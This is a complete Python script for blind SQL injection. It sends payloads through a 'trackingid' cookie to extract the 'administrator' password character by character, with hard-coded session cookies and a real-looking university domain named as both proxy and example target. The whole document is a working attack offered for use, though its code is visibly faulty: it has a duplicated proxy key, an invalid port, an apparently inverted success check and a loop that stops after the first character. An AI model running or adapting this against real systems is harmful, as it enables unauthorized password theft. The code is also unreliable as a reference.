import os
import sys
import requests
import urllib3
import urllib.parse
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://kabarak.ac.ke:443443' , 'http': 'http://kabarak.ac.ke:8080'}

def sql_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "'AND (SELECT ascii(SUBSTRING(password, %s, 1)) FROM users WHERE username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'trackingid': 'JMTSzti8usANUPzD' + sqli_payload_encoded, 'session': 'zOIGloGWySCgjabiJEPCT6vz1ktPX8xN'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                password_extracted += chr(j)
        else:
            sys.stdout.write('\r' + password_extracted)
            sys.stdout.flush()
            break

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        print("(+) example: %s www.kabarak.ac.ke" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Retrieving administrator password....")
    sql_password(url)

if __name__ == "__main__":
    main()
